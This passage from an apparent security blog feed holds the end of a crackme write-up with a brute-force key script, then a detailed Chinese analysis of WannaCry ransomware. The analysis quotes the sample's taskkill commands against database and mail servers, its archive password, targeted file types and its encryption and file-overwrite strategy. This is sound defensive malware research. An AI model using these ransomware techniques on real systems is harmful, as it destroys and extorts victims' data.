//中间因为长度折腾了好久，后面查了才知道这是回文数，翻半天没有什么算法，脚本已经跑起来了</div></pre></td></tr></table></figure> <p>怎么求逆呢？算法不好，那就脚本跑吧！</p> <h1 id="3-脚本跑"><a href="#3-脚本跑" class="headerlink" title="3. 脚本跑"></a>3. 脚本跑</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">i = 11111111#</div><div class="line">while True:</div><div class="line">    break</div><div class="line">    is1 = str(i)</div><div class="line">    is2_len = len(is1) </div><div class="line">    </div><div class="line">    is1 = is1[:is2_len-1]</div><div class="line">    is2 = is1[::-1]</div><div class="line">    </div><div class="line">    k = i*9*9*i</div><div class="line">        </div><div class="line">    ks1 = &apos;&apos;</div><div class="line">    ks = &apos;&apos;</div><div class="line">    while True:</div><div class="line">       </div><div class="line">        #print i, k</div><div class="line">        #break</div><div class="line">        ks1 = str(k)</div><div class="line">        </div><div class="line">        lll = len(ks1)/2</div><div class="line">        </div><div class="line">        if len(ks1) &gt; 2*is2_len:</div><div class="line">            #print &apos;long out - 1&apos;, i, len(ks1), 2*is2_len</div><div class="line">            break</div><div class="line">        </div><div class="line">        if (is2_len + len(ks1))&gt;1024:</div><div class="line">            #print &apos;long out - 1&apos;, i, is2_len + len(ks1)</div><div class="line">            break</div><div class="line">        </div><div class="line">        if (len(ks1)%2!=0) and (is1[0:1] == ks1[lll:lll+1]):</div><div class="line">            print  &apos;get -success1 &gt; &apos;, i, is1, k</div><div class="line">            break</div><div class="line"></div><div class="line">        if len(ks1)&gt;1024:</div><div class="line">            #print &apos;long out&apos;, i</div><div class="line">            break </div><div class="line">        </div><div class="line">        k = k * i*9</div><div class="line"></div><div class="line">    ls2_len1 = is2_len-1</div><div class="line">    ks = ks1[:ls2_len1]</div><div class="line">    </div><div class="line">    if ((is1 == ks) and (is2 == ks1[(-1*ls2_len1):])):</div><div class="line">        print  &apos;get -success &gt; &apos;, i, is1, k</div><div class="line">        print &apos;&apos;</div><div class="line">    </div><div class="line">    i += 1</div><div class="line">    </div><div class="line">    if i % 10000000 == 0:</div><div class="line">        print &apos;...&apos;, i</div><div class="line">    </div><div class="line">    if i &gt; 99999999999999999999:</div><div class="line">        break</div></pre></td></tr></table></figure> <h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h1><p>结果最后跑出来是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">get -success &gt;  12345679 1234567 12345678987654321</div></pre></td></tr></table></figure></p> <p>因为代码中处理字符存为数值是倒着的，所以key应该是97654321</p> <p>转载请注明出处：<a href="https://anhkgg.github.io/kxctf2017_writeup2">https://anhkgg.github.io/kxctf2017_writeup2</a></p> ]]></content>          <summary type="html">            &lt;p&gt;题目入口：&lt;a href=&quot;http://ctf.pediy.com/game-fight-32.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://ctf.pediy.com/game-fight-32.htm&lt;/a&gt;，可下载相关文件&lt;/p&gt; &lt;h1 id=&quot;0-定位算法位置&quot;&gt;&lt;a href=&quot;#0-定位算法位置&quot; class=&quot;headerlink&quot; title=&quot;0. 定位算法位置&quot;&gt;&lt;/a&gt;0. 定位算法位置&lt;/h1&gt;&lt;p&gt;由于是console程序，并且没有隐藏字符串，通过OD/IDA找到关键字符串，所在函数就是关键算法函数：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;.data:00409058 aWellDone       db &amp;apos;WELL DONE!&amp;apos;,0Ah,0   ; DATA XREF: _main:loc_401257o&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:00409064 aWrongKey___    db &amp;apos;WRONG KEY...&amp;apos;,0Ah,0 ; DATA XREF: _main+231o&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:00409072                 align 4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:00409074 aKeyFormatError db &amp;apos;key format error...&amp;apos;,0Ah,0 ; DATA XREF: _main+9Ao&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;          </summary>            <category term="ctf" scheme="https://anhkgg.github.io/categories/ctf/"/>                 <category term="ctf" scheme="https://anhkgg.github.io/tags/ctf/"/>            <category term="writeup" scheme="https://anhkgg.github.io/tags/writeup/"/>            <category term="看雪" scheme="https://anhkgg.github.io/tags/%E7%9C%8B%E9%9B%AA/"/>            <category term="kanxue" scheme="https://anhkgg.github.io/tags/kanxue/"/>            <category term="bbs.pediy.com" scheme="https://anhkgg.github.io/tags/bbs-pediy-com/"/>            <category term="crackme" scheme="https://anhkgg.github.io/tags/crackme/"/>        </entry>      <entry>     <title>WannaCry深度详细分析报告</title>     <link href="https://anhkgg.github.io/wannacry-analyze-report/"/>     <id>https://anhkgg.github.io/wannacry-analyze-report/</id>     <published>2017-05-26T01:29:07.000Z</published>     <updated>2017-05-26T05:27:07.176Z</updated>          <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00. 前言"></a>0x00. 前言</h1><p>最近，WannaCry是火了一把，到处都是分析文章，报告，解决方案等等。</p> <p>趁着这个热度，我也来跟风一把。</p> <p>前前后后把WannaCry详细分析了一遍。</p> <p>从文件释放、启动加密器、文件加密策略、加密算法、到解密过程中所有细节进行了详尽深入的分析。</p> <a id="more"></a> <p>由于没有拿到初始样本，没有包含漏洞利用部分的分析。</p> <p>样本信息：</p> <blockquote> <p>MD5: 84C82835A5D21BBCF75A61706D8AB549</p> <p>SHA1: 5FF465AFAABCBF0150D1A3AB2C2E74F3A4426467</p> <p>CRC32: 4022FCAA</p> <p>无壳 / Visual C++ 6.0</p> </blockquote> <p>下面具体看分析内容。</p> <h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01. 概述"></a>0x01. 概述</h1><ol> <li>样本首先通过资源释放各种文件，包括加密器、解密器、几个辅助程序、桌面背景图、说明文件、语言文件等等。</li> <li>内存加载加密器模块，执行加密部分功能。</li> <li>枚举目标文件（目标文件后缀列表后面给出），加密为.WNCRY文件（加密策略后面详述），删除原始文件。</li> <li>复制自身为tasksche.exe，安装启动项</li> <li>启动解密器</li> </ol> <p>大致流程图如图：</p> <p><img src="/img/wannacry/00.png" alt="img"></p> <p>下面开始详细分析各个部分细节。</p> <h1 id="0x02-释放文件"><a href="#0x02-释放文件" class="headerlink" title="0x02. 释放文件"></a>0x02. 释放文件</h1><p>设置当前目录为工作目录，然后查找PE中资源(XIA)。</p> <p><img src="/img/wannacry/1_0.png" alt="img"></p> <p>直接用资源工具看一下，发现是PK开头的，多半是个压缩文件了，导出来试试。</p> <p><img src="/img/wannacry/1_1.png" alt="img"></p> <p>解压还要密码，看代码密码是WNcry@2ol7，解压成功。</p> <p><img src="/img/wannacry/1_3.png" alt="img"></p> <p>读取资源数据后，解压释放文件到当前目录。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">//部分释放文件说明：</div><div class="line">b.wnry      //桌面背景图片</div><div class="line">c.wnry      //加密相关</div><div class="line">msg/*.wnry  //语言相关文件</div><div class="line">r.wnry      //@Please_Read_Me@.txt</div><div class="line">s.wnry      //是压缩文件，打包的是Tor相关组件</div><div class="line"></div><div class="line">taskdl.exe  //删除回收站文件</div><div class="line">taskse.exe  //用于启动其他session的@WanaDecryptor@.exe</div><div class="line"></div><div class="line">u.wnry      //@WanaDecryptor@.exe 解密器 </div><div class="line">t.wnry      //解密后是加密器</div></pre></td></tr></table></figure> <p>在三个比特币交易地址中随机选择一个，写入c.wnry</p> <p><img src="/img\wannacry\1_6.png" alt="img"></p> <p>然后设置当前目录为隐藏属性，且设置为everyone可访问</p> <p><img src="/img/wannacry/1_2.png" alt="img"></p> <p>然后初始化Crypt相关函数，用于后面的解密操作。</p> <p>开始操作文件t.wnry，看看内容，应该是个加密文件。</p> <p><img src="/img/wannacry/1_4.png" alt="img"></p> <p>然后通过crypt API将t.wnry解密之后（解密后是个DLL模块，dump数据后可以用于分析），映射到内存（自己loaddll），然后找到导出接口函数TaskStart调用，开始加密工作。</p> <p><img src="/img/wannacry/1_5.png" alt="img"></p> <h1 id="0x03-加密部分"><a href="#0x03-加密部分" class="headerlink" title="0x03. 加密部分"></a>0x03. 加密部分</h1><p>TaskStart一进来，通过MsWinZonesCacheCounterMutexA的Mutex进行单示例检查，有则退出，没有继续工作。</p> <p>然后是设置工作目录，读取c.wnry信息。</p> <p>检查是否是SYSTEM账户。</p> <p><img src="/img\wannacry\3_0.png" alt="img"></p> <p>初始化Crypt相关函数，以及文件操作函数（增加一点分析成本）。</p> <p><img src="/img\wannacry\3_1.png" alt="img"><br><img src="/img\wannacry\3_2.png" alt="img"></p> <p>检查Global\MsWinZonesCacheCounterMutexW，Global\MsWinZonesCacheCounterMutexA\0是否存在，</p> <p>存在则表示加密相关准备工作已经完成，不在进行，没有则创建Global\MsWinZonesCacheCounterMutexA\0</p> <p>检查00000000.dky和00000000.pky是否存在，存在是否配对的密钥，是则加密相关准备工作已经完成，不在进行，没有则进行后续工作。</p> <p><img src="/img\wannacry\3_6.png" alt="img"></p> <p>如果加密相关准备工作已经完成，创建一个线程，完成如下工作（记为工作A）：</p> <p>a). 如果不是管理员权限，并且不是SYSTEM账户，通过taskse.exe提权启动@WanaDecryptor@.exe，是则普通方式启动@WanaDecryptor@.exe</p> <p><img src="/img\wannacry\3_3.png" alt="img"></p> <p>b). 安装tasksche.exe启动项（注册表Run），键名随机</p> <p><img src="/img\wannacry\3_4.png" alt="img"></p> <p>如果加密准备未完成，初始化密钥，保存到00000000.pky, 00000000.eky。</p> <blockquote> <p>由于时间关系，具体加密密钥产生过程不再详述，很多分析文章说的很清楚了，本文重点不在此。</p> </blockquote> <p>然后是如果00000000.res不存在，通过CryptGenRandom产生8字节随机值，后续会写入00000000.res</p> <p>接着创建5个工作线程，完成不同的工作。</p> <p>a). 线程1每隔25秒循环写入数据到00000000.res，包括前面CryptGenRandom生成的随机值，已经更新的当前时间，直到线程退出标记为真退出</p> <p><img src="/img\wannacry\3_5.png" alt="img"></p> <p>b). 线程2每5秒检查00000000.dky和00000000.pky是否存在，存在是否配对的密钥，是则设置全局标志，然后退出线程</p> <p><img src="/img\wannacry\3_7.png" alt="img"></p> <p>c). 线程3监测新增磁盘，加密新磁盘的文件（和其他磁盘加密相同）</p> <p><img src="/img\wannacry\3_8.png" alt="img"></p> <p>d). 线程4每30秒启动taskdl.exe清除所有磁盘的回收站文件</p> <p>e). 线程5完成的也是前面提到的工作A的内容，不再详述</p> <p>然后就是重点了，加密文件部分了。</p> <h2 id="加密文件部分"><a href="#加密文件部分" class="headerlink" title="加密文件部分"></a>加密文件部分</h2><p>拷贝u.wnry为@WanaDecryptor@.exe，通过写一个bat创建@WanaDecryptor@.exe.lnk快捷方式。</p> <p><img src="/img\wannacry\3_9.png" alt="img"></p> <p><img src="/img\wannacry\2_11.png" alt="img"></p> <p>读取r.wnry内容，生成@Please_Read_Me@.txt文件。</p> <p>枚举当前用户桌面和文档目录文件，进行加密（没有设置不复写标记，删除前会复写）。</p> <p>枚举All Users\Desktop和All Users\Documents，找到非当前用户目录进行加密（没有设置不复写标记，删除前会复写）。</p> <p>下面记为工作B:</p> <p>通过taskkill强删Microsoft.Exchange、sql和mysql进程（加密其数据）</p> <blockquote> <p>anhkgg_CreateProc_10001080(aTaskkill_exeFI, 0, 0);// taskkill.exe /f /im Microsoft.Exchange.<em><br>anhkgg_CreateProc_10001080(aTaskkill_exe_0, 0, 0);// taskkill.exe /f /im MSExchange</em><br>anhkgg_CreateProc_10001080(aTaskkill_exe_1, 0, 0);// ‘taskkill.exe /f /im sqlserver.exe<br>anhkgg_CreateProc_10001080(aTaskkill_exe_2, 0, 0);// taskkill.exe /f /im sqlwriter.exe<br>anhkgg_CreateProc_10001080(aTaskkill_exe_3, 0, 0);// taskkill.exe /f /im mysqld.exe</p> </blockquote> <p>加密磁盘中文件，每个分区重复两次（会设置不复写标记，删除前不会复写）。</p> <p>枚举All Users\Desktop目录，复制b.wnry到目录中为@WanaDecryptor@.bmp，设置桌面背景为@WanaDecryptor@.bmp，</p> <p>执行@WanaDecryptor@.exe co</p> <p>更新00000000.res</p> <p>cmd.exe /c start /b @WanaDecryptor@.exe vs</p> <p>每个磁盘(fixed)创建x:/$Recycle/hibsys.WNCRYT（系统盘写在temp目录，x:/$Recycle被设置为系统隐藏属性），读取分区可用空间大小，大于0x40000000（1GB）的话，每10微秒循环写入0xa00000个字节的’U’，写20次，然后删除该文件，并且设置了重启后删除。</p> <p>每隔60s重复工作B，直到退出标志为真。</p> <h2 id="文件枚举"><a href="#文件枚举" class="headerlink" title="文件枚举"></a>文件枚举</h2><p>枚举文件采用方式为：</p> <ol> <li>枚举当前目录中所有文件(排除文件看下文)，加入文件链表，记录所有子目录（排除目录看下文）到目录链表。</li> <li>本目录文件有加密操作（具体看下文）</li> <li>分析目录层级，少于等于6层的，拷贝lease_Read_Me@.txt到目录，5-6层的拷贝@WanaDecryptor@.exe.lnk，1-4层拷贝@WanaDecryptor@.exe到目录。</li> <li>然后遍历目录链表，枚举子目录，重复1操作。</li> <li>子目录枚举完成，所有文件记录到链表，进行后续操作。</li> </ol> <p>目录和文件采用相同的链表结果，总结如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">struct FILE_LIST_CONTEXT</div><div class="line">&#123;</div><div class="line">    DWORD vtable;</div><div class="line">    FILE_LIST *list;//</div><div class="line">    DWORD file_count;//8</div><div class="line">&#125;</div><div class="line"></div><div class="line">struct FILE_LIST</div><div class="line">&#123;</div><div class="line">    FILE_LIST* prev;</div><div class="line">    FILE_LIST* next;</div><div class="line">    FILE_INFO file;//8</div><div class="line">&#125;</div><div class="line"></div><div class="line">struct FILE_INFO</div><div class="line">&#123;</div><div class="line">    WCHAR path[0x168];//</div><div class="line">    WCHAR name[0x104];//2d0</div><div class="line">    DWORD nFileSizeLow;//4d8</div><div class="line">    DWORD nFileSizeHigh;//4dc</div><div class="line">    DWORD type;//4e0  FILE_TYPE</div><div class="line">&#125;//0x4e4</div></pre></td></tr></table></figure> <h2 id="排除目录"><a href="#排除目录" class="headerlink" title="排除目录"></a>排除目录</h2><p>枚举子目录时，会跳过如下目录（保证系统正常工作）：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">\Intel </div><div class="line">\ProgramData</div><div class="line">\WINDOWS</div><div class="line">\Program Files</div><div class="line">\Program Files (x86)</div><div class="line">\AppData\Local\Temp</div><div class="line">\Local Settings\Temp</div><div class="line">This folder protects against ransomware. Modifying it will reduce protection</div><div class="line">Temporary Internet Files</div><div class="line">Content.IE5</div></pre></td></tr></table></figure> <h2 id="文件分类"><a href="#文件分类" class="headerlink" title="文件分类"></a>文件分类</h2><p>枚举文件时，首先跳过 @Please_Read_Me@.txt，@WanaDecryptor@.exe.lnk， @WanaDecryptor@.bmp</p> <p>然后检查文件类型，跳过0,1,6类型文件，其他文件加入链表。</p> <p>具体类型如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">0 没有后缀以及其他类型后缀</div><div class="line">1 .exe, .dll</div><div class="line">4 .WNCRYT </div><div class="line">5 .WNCYR</div><div class="line">6 .WNCRY</div><div class="line"></div><div class="line">2.</div><div class="line">&quot;.doc&quot;&quot;.docx&quot;&quot;.xls&quot;&quot;.xlsx&quot;&quot;.ppt&quot;&quot;.pptx&quot;&quot;.pst&quot;&quot;.ost&quot;&quot;.msg&quot;&quot;.eml&quot;&quot;.vsd&quot;&quot;.vsdx&quot;</div><div class="line">&quot;.txt&quot;&quot;.csv&quot;&quot;.rtf&quot;&quot;.123&quot;&quot;.wks&quot;&quot;.wk1&quot;&quot;.pdf&quot;&quot;.dwg&quot;&quot;.onetoc2&quot;&quot;.snt&quot;&quot;.jpeg&quot;&quot;.jpg&quot;</div><div class="line"></div><div class="line">3. </div><div class="line">&quot;.docb&quot;&quot;.docm&quot;&quot;.dot&quot;&quot;.dotm&quot;&quot;.dotx&quot;&quot;.xlsm&quot;&quot;.xlsb&quot;&quot;.xlw&quot;&quot;.xlt&quot;&quot;.xlm&quot;&quot;.xlc&quot;&quot;.xltx&quot;&quot;.xltm&quot;&quot;.pptm&quot;&quot;.pot&quot;&quot;.pps&quot;&quot;.ppsm&quot;&quot;.ppsx&quot;&quot;.ppam&quot;&quot;.potx&quot;&quot;.potm&quot;</div><div class="line">&quot;.edb&quot;&quot;.hwp&quot;&quot;.602&quot;&quot;.sxi&quot;&quot;.sti&quot;&quot;.sldx&quot;&quot;.sldm&quot;&quot;.sldm&quot;&quot;.vdi&quot;&quot;.vmdk&quot;&quot;.vmx&quot;&quot;.gpg&quot;&quot;.aes&quot;&quot;.ARC&quot;&quot;.PAQ&quot;&quot;.bz2&quot;&quot;.tbk&quot;&quot;.bak&quot;&quot;.tar&quot;&quot;.tgz&quot;&quot;.gz&quot;&quot;.7z&quot;&quot;.rar&quot;</div><div class="line">&quot;.zip&quot;&quot;.backup&quot;&quot;.iso&quot;&quot;.vcd&quot;&quot;.bmp&quot;&quot;.png&quot;&quot;.gif&quot;&quot;.raw&quot;&quot;.cgm&quot;&quot;.tif&quot;&quot;.tiff&quot;&quot;.nef&quot;&quot;.psd&quot;&quot;.ai&quot;&quot;.svg&quot;&quot;.djvu&quot;&quot;.m4u&quot;&quot;.m3u&quot;&quot;.mid&quot;&quot;.wma&quot;&quot;.flv&quot;&quot;.3g2&quot;&quot;.mkv&quot;</div><div class="line">&quot;.3gp&quot;&quot;.mp4&quot;&quot;.mov&quot;&quot;.avi&quot;&quot;.asf&quot;&quot;.mpeg&quot;&quot;.vob&quot;&quot;.mpg&quot;&quot;.wmv&quot;&quot;.fla&quot;&quot;.swf&quot;&quot;.wav&quot;&quot;.mp3&quot;&quot;.sh&quot;&quot;.class&quot;&quot;.jar&quot;&quot;.java&quot;&quot;.rb&quot;&quot;.asp&quot;&quot;.php&quot;&quot;.jsp&quot;&quot;.brd&quot;&quot;.sch&quot;</div><div class="line">&quot;.dch&quot;&quot;.dip&quot;&quot;.pl&quot;&quot;.vb&quot;&quot;.vbs&quot;&quot;.ps1&quot;&quot;.bat&quot;&quot;.cmd&quot;&quot;.js&quot;&quot;.asm&quot;&quot;.h&quot;&quot;.pas&quot;&quot;.cpp&quot;&quot;.c&quot;&quot;.cs&quot;&quot;.suo&quot;&quot;.sln&quot;&quot;.ldf&quot;&quot;.mdf&quot;&quot;.ibd&quot;&quot;.myi&quot;&quot;.myd&quot;&quot;.frm&quot;&quot;.odb&quot;&quot;.dbf&quot;</div><div class="line">&quot;.db&quot;&quot;.mdb&quot;&quot;.accdb&quot;&quot;.sql&quot;&quot;.sqlitedb&quot;&quot;.sqlite3&quot;&quot;.asc&quot;&quot;.lay6&quot;&quot;.lay&quot;&quot;.mml&quot;&quot;.sxm&quot;&quot;.otg&quot;&quot;.odg&quot;&quot;.uop&quot;&quot;.std&quot;&quot;.sxd&quot;&quot;.otp&quot;&quot;.odp&quot;&quot;.wb2&quot;&quot;.slk&quot;&quot;.dif&quot;&quot;.stc&quot;</div><div class="line">&quot;.sxc&quot;&quot;.ots&quot;&quot;.ods&quot;&quot;.3dm&quot;&quot;.max&quot;&quot;.3ds&quot;&quot;.uot&quot;&quot;.stw&quot;&quot;.sxw&quot;&quot;.ott&quot;&quot;.odt&quot;&quot;.pem&quot;&quot;.p12&quot;&quot;.csr&quot;&quot;.crt&quot;&quot;.key&quot;&quot;.pfx&quot;&quot;.der&quot;</div></pre></td></tr></table></figure> <p>总结为下面的enum</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">enum FILE_TYPE</div><div class="line">&#123;</div><div class="line">    FILE_TYPE_NULL = 0,</div><div class="line">    FILE_TYPE_EXEDLL,</div><div class="line">    FILE_TYPE_DOC,</div><div class="line">    FILE_TYPE_DOCEX,</div><div class="line">    FILE_TYPE_WNCRYT, //.wncryt</div><div class="line">    FILE_TYPE_WNCYR, //.wncyr</div><div class="line">    FILE_TYPE_WNCRY //.wncry</div><div class="line">&#125;</div></pre></td></tr></table></figure> <h2 id="文件加密策略"><a href="#文件加密策略" class="headerlink" title="文件加密策略"></a>文件加密策略</h2><p>加密文件函数中有个参数，我取做cmd（取值是1-4）。因为不同的值会有不同的操作方式。</p> <p>根据cmd和文件类型和大小等等，函数<code>sub_10002E70</code>返回不同的操作方式。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">1. cmd&gt;=4, FOT_ENCRYPT_NORMAL_4</div><div class="line">2. cmd&lt;=3，FILE_TYPE_NULL，FOT_NULL_1 </div><div class="line">3. cmd==3, 非FILE_TYPE_NULL，FOT_ENCRYPT_NORMAL_4</div><div class="line">4. cmd&lt;=2, .wncyr, FOT_NULL_1</div><div class="line">5. cmd&lt;=2, .wncryt, FOT_DELETE_FILE_2</div><div class="line"></div><div class="line">//用于枚举中的操作，直接操作普通文件（不加入链表）和大文件.doc（加入链表），小文件.doc,.docex加入链表，其他文件不加入链表</div><div class="line">//枚举中完成加密操作的文件不加入链表了</div><div class="line">6. cmd==1, .doc, 大文件, FOT_ENCRYPT_WRITESRC_3 //也要加入链表</div><div class="line">7. cmd==1, .doc, 普通文件, FOT_ENCRYPT_NORMAL_4</div><div class="line">8. cmd==1, .doc, 小文件，FOT_NULL_1</div><div class="line">9. cmd==1, .docex, FOT_NULL_1</div><div class="line"></div><div class="line">10. cmd==2, .doc, FOT_NULL_1</div><div class="line">11. cmd==2, .docex, 大文件， FOT_ENCRYPT_WRITESRC_3</div><div class="line">12. cmd==2, .docex, 小文件，FOT_NULL_1</div><div class="line">13. cmd==2, .docex, 普通文件，FOT_ENCRYPT_NORMAL_4</div><div class="line"></div><div class="line">其他返回FOT_NULL_0</div></pre></td></tr></table></figure> <p>上面提到的大文件，普通文件，小文件定义如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">小于0x400的是小文件，大于0xC800000的是大文件，中间的是普通文件</div></pre></td></tr></table></figure> <p><img src="/img\wannacry\4_0.png" alt="img"></p> <p>上面提到的作方式具体定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//返回0表示未作处理，或者处理未完成，需要插入链表或者不从链表中删除</div><div class="line">enum FILE_OP_TYPE&#123;</div><div class="line">    FOT_NULL_0 = 0,     //0 未操作，返回1</div><div class="line">    FOT_NULL_1,         //1,default 未操作，返回0</div><div class="line">    FOT_DELETE_FILE_2,    //2 //删除文件，返回1</div><div class="line">    FOT_ENCRYPT_WRITESRC_3, //3 改源文件，返回0</div><div class="line">    FOT_ENCRYPT_NORMAL_4, //4 只加密，返回1</div><div class="line">&#125;</div></pre></td></tr></table></figure></p> <p>代码如下：</p> <p><img src="/img\wannacry\4_1.png" alt="img"></p> <p>对加密策略做一下总结：<br>a). 在枚举文件中，cmd=1，会对普通文件直接加密为.WNCRY，不再加入链表，大文件处理为.WNCYR，以及其他未作处理文件继续加入链表等待处理。</p> <p><img src="/img\wannacry\4_2.png" alt="img"></p> <p>b). 枚举完成后，cmd从2-4，每个cmd遍历都遍历加密文件。</p> <ul> <li>cmd=2，加密FILE_TYPE_DOCEX普通文件为.WNCRY（移出链表），以及FILE_TYPE_DOCEX大文件为.WNCYR。</li> <li>cmd=2, 删除.WNCRYT</li> <li>cmd=3, 加密链表中所有文件（移出链表）</li> <li>cmd=4, 加密可能剩余链表中的文件</li> </ul> <p><img src="/img\wannacry\4_3.png" alt="img"></p> <h2 id="文件内容加密过程"><a href="#文件内容加密过程" class="headerlink" title="文件内容加密过程"></a>文件内容加密过程</h2><p>验证文件是否未加密，或者未加密完成。已完成加密，直接退出。</p> <p><img src="/img\wannacry\4_5.png" alt="img"></p> <p>对于FOT_ENCRYPT_WRITESRC_3，按写打开源文件，将文件头0x10000字节内容移动到尾部，头部内容清零，写入加密文件头部数据，然后源文件移动为.WNCYR，完成退出。</p> <p><img src="/img\wannacry\4_4.png" alt="img"></p> <p>对于FOT_ENCRYPT_NORMAL_4，按读打开源文件，对于普通文件进行随机值检查，满足100倍数，且文件数据小于10，那么换本次加密算法为免费解密的算法，标记，加密完成后调用回调函数写入f.wnry中。</p> <p><img src="/img\wannacry\4_6.png" alt="img"><br><img src="/img\wannacry\4_7.png" alt="img"></p> <p>加密前，将文件后缀加上T变成.WNCRYT，然后创建文件。</p> <p>写入加密文件头部数据</p> <p><img src="/img\wannacry\4_8.png" alt="img"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">//加密文件头部数据结构</div><div class="line">struct </div><div class="line">&#123;</div><div class="line">    char magic[8];//WANACRY!&apos;</div><div class="line">    int size;//0x100</div><div class="line">    char key[size];//</div><div class="line">    int type;//加密文件类型3,4</div><div class="line">    __int64 datasize;// &lt;=0x6400000 源文件大小</div><div class="line">    char data[1];//</div><div class="line">&#125;</div></pre></td></tr></table></figure></p> <p>对于.WNCYR文件（FOT_ENCRYPT_WRITESRC_3处理过一次），读取尾部0x10000的数据加密写入文件。</p> <p><img src="/img\wannacry\4_9.png" alt="img"></p> <p>然后每0x1000读取加密，写入.WNCRYT文件，循环直到所有数据加密。移动.WNCRYT为.WNCRT。</p> <p><img src="/img\wannacry\4_10.png" alt="img"></p> <p>对于FOT_ENCRYPT_NORMAL_4，加密完成后会将源文件加入删除链表，在删除线程中文件会被复写删除。</p> <p>复写通过生成随机值或者一片’U’，循环写入文件，细节不再阐述（桌面我的文档目录文件目录会被复写，其他目录文件不会）。</p> <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>至此，wannacry大部分内容都分析完成，由于时间精力的关系，后续解密器就不再分析了。<br>最后说一句，现在这个时代不再适合裸奔！！！</p> <p>转载请注明出处：<a href="https://anhkgg.github.io/wannacry-analyze-report">https://anhkgg.github.io/wannacry-analyze-report</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; 